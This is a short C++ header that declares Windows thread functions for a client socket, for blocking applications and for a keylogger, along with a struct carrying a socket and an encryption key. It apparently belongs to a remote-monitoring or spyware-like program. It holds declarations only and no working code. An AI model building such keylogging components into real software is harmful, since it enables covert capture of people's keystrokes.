/*
*      Copyright 2016 Riccardo Melioli. All Rights Reserved.
*/

#ifndef THREAD_H_
#define THREAD_H_

#include <WS2tcpip.h>

#include <string>
#include <ctime>
#include <sstream>
#include <list>
#include <fstream>

#include "crypto.h"

DWORD WINAPI ClientSocketThread(void* arg);
DWORD WINAPI BlockAppsThread(void* arg);
DWORD WINAPI KeyloggerThread(void* arg);

struct ClientSocketArgs {
	SOCKET ClientSocket;
	const char* EncryptionKey;
};

#endif /* THREAD_H_ */
